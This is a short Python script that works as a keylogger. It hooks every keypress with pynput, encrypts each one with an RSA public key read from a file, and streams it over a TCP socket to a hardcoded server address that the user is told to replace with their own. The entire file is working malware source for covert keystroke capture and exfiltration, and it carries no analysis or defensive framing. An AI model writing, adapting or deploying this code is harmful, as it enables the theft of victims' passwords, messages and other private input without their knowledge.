import socket
from pynput.keyboard import Listener
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes

# TCP server details
SERVER_IP = '10.20.26.134'  # Change to your server's IP
PORT = 5005


# Load the public key for encryption
def load_public_key():
    with open("public_key.pem", "rb") as key_file:
        public_key = serialization.load_pem_public_key(key_file.read())
    return public_key


# Encrypt data using RSA public key
def encrypt_data(public_key, message):
    encrypted = public_key.encrypt(
        message.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted


# Function to capture keypresses and send them to the server
def on_press(key):
    letter = str(key).replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'

    try:
        # Load the public key
        public_key = load_public_key()

        # Encrypt the keypress
        encrypted_data = encrypt_data(public_key, letter)

        # Send the encrypted keypress to the server
        client_socket.sendall(encrypted_data)
    except Exception as e:
        print(f"Failed to send data: {e}")


# Connect to the TCP server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, PORT))

# Start listening for keypresses
with Listener(on_press=on_press) as listener:
    listener.join()
